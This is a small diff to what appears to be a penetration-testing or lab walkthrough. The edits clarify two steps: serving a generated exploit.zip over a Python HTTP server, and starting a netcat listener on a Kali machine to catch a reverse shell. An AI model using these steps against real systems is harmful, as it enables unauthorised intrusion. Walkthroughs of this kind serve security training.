@@ -1837,6 +1837,8 @@ print(f"Created exploit.zip with filename: {exploit_filename}")
 
 #### 4.3.2 Generate and Serving the Exploit
 
+In your local terminal run the script and a python server.
+
 **Command:** `python3 exploit.py && python3 -m http.server 80`
 
 **Breakdown:**
@@ -1866,7 +1868,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 #### 4.3.3 Start your Netcat listener
 
-On your Kali machine, start a listener: `nc -lvnp 4445`.
+On your Kali machine in another terminal window, start a listener: `nc -lvnp 4445`.
 
 **Breakdown:**
 
